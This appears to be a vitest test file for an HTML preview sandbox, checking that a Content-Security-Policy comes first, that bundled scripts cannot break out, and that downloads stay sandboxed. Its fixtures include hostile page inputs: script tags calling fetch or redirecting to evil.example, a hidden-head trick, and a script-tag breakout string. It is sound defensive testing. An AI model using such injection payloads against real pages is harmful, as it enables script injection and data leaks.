import { describe, expect, it } from "vitest";
import {
  artifactProblem,
  DOWNLOAD_OUTER_CSP,
  downloadDocument,
  MAX_ARTIFACT_CHARS,
  PREVIEW_CSP,
  PREVIEW_SANDBOX,
  previewDocument,
} from "./artifact.ts";

/** Everything up to and including our own head: what is in force before any of the page is parsed. */
const OUR_HEAD = /^<!doctype html><html><head><meta charset="utf-8">.*?<\/head>/s;
const policyAt = (doc: string) => doc.indexOf("Content-Security-Policy");

describe("previewDocument", () => {
  it("starts every document with our own head, so the policy precedes anything the page contains", () => {
    for (const page of [
      "<h1>Hi</h1>",
      '<!DOCTYPE html><html lang="id"><head><title>T</title><script>window.x=1</script></head><body>B</body></html>',
      "<html><body>B</body></html>",
      "  <!doctype HTML>\n<p>x</p>",
    ]) {
      const doc = previewDocument(page);
      expect(doc).toMatch(OUR_HEAD);
      expect(doc.match(/Content-Security-Policy/g)).toHaveLength(1);
      expect(policyAt(doc)).toBeLessThan(doc.length - page.length);
    }
  });

  it("keeps the page as written after our head, dropping only its leading doctype", () => {
    const page = '<!DOCTYPE html><html lang="id"><head><title>T</title></head><body>B</body></html>';
    const doc = previewDocument(page);
    expect(doc.endsWith('<html lang="id"><head><title>T</title></head><body>B</body></html>')).toBe(true);
    expect(doc.match(/<!doctype/gi)).toHaveLength(1); // ours: standards mode is kept
  });

  // Regression: the policy used to be spliced in after the first "<head" in the page, which a hostile page controls.
  it("cannot be tricked into hiding the policy or running code before it", () => {
    const hidden = previewDocument('<!-- <head> --><script>fetch("https://evil.example")</script>');
    expect(hidden).toMatch(OUR_HEAD);
    expect(policyAt(hidden)).toBeLessThan(hidden.indexOf("<!--"));

    const early = previewDocument('<script>fetch("https://evil.example")</script><html><head></head></html>');
    expect(policyAt(early)).toBeLessThan(early.indexOf("fetch"));

    const inString = previewDocument('<script>const s = "<head>";</script><p>x</p>');
    expect(policyAt(inString)).toBeLessThan(inString.indexOf("const s"));
  });

  it("places bundled libraries before the page's own scripts, and cannot be broken out of", () => {
    const doc = previewDocument("<head></head><script>use(Chart)</script>", [
      "var Chart = 1; /* </script><img src=x> */",
    ]);
    expect(doc.indexOf("var Chart")).toBeLessThan(doc.indexOf("use(Chart)"));
    expect(policyAt(doc)).toBeLessThan(doc.indexOf("var Chart"));
    expect(doc).not.toContain("</script><img");
    expect(doc).toContain("<\\/script><img");
  });

  it("drops a byte-order mark and keeps the page's body untouched", () => {
    expect(previewDocument("\uFEFF<p>é</p>")).toContain("<p>é</p>");
    expect(previewDocument("\uFEFF<p>é</p>")).not.toContain("\uFEFF");
  });
});

describe("downloadDocument", () => {
  it("wraps the page in the same locked frame, so an opened download stays contained", () => {
    const file = downloadDocument(
      'Q3 <"Sales">',
      '<script>location.href="https://evil.example"</script><h1>x</h1>',
    );
    expect(file).toMatch(/^<!doctype html>/);
    expect(file).toContain(`<iframe sandbox="${PREVIEW_SANDBOX}"`);
    expect(file).toContain(DOWNLOAD_OUTER_CSP);
    // The outer document runs nothing: the page's markup only exists escaped inside srcdoc.
    expect(file.match(/<script/gi)).toBeNull();
    expect(file).toContain("&lt;script&gt;location.href=&quot;https://evil.example&quot;");
    expect(file).toContain("<title>Q3 &lt;&quot;Sales&quot;&gt;</title>");
  });

  it("keeps the outer policy as closed as the page's, apart from framing its inline page", () => {
    // A srcdoc frame inherits the outer policy, so it must allow what the page needs and nothing more.
    expect(DOWNLOAD_OUTER_CSP).toContain("frame-src about: blob: data:");
    expect(DOWNLOAD_OUTER_CSP.replace("frame-src about: blob: data:", "frame-src 'none'")).toBe(PREVIEW_CSP);
  });

  it("carries the page's own policy inside the frame", () => {
    const file = downloadDocument("T", "<p>x</p>");
    expect(file).toContain(`Content-Security-Policy&quot; content=&quot;${PREVIEW_CSP}&quot;`);
  });
});

describe("the policy", () => {
  it("allows scripts and styles but closes every way out", () => {
    for (const closed of [
      "connect-src 'none'",
      "form-action 'none'",
      "frame-src 'none'",
      "base-uri 'none'",
      "default-src 'none'",
    ]) {
      expect(PREVIEW_CSP).toContain(closed);
    }
    expect(PREVIEW_CSP).not.toMatch(/https?:|\*/);
    expect(PREVIEW_CSP).toContain("img-src data:");
  });

  it("sandboxes the frame to scripts only", () => {
    expect(PREVIEW_SANDBOX).toBe("allow-scripts");
  });
});

describe("artifactProblem", () => {
  it("accepts a normal page and refuses an empty or oversized one", () => {
    expect(artifactProblem("Sales", "<p>x</p>")).toBeNull();
    expect(artifactProblem("  ", "<p>x</p>")).toMatch(/title/);
    expect(artifactProblem("Sales", "   ")).toMatch(/empty/);
    expect(artifactProblem("x".repeat(500), "<p>x</p>")).toMatch(/title/);
    expect(artifactProblem("Sales", "x".repeat(MAX_ARTIFACT_CHARS + 1))).toMatch(/longer/);
  });
});
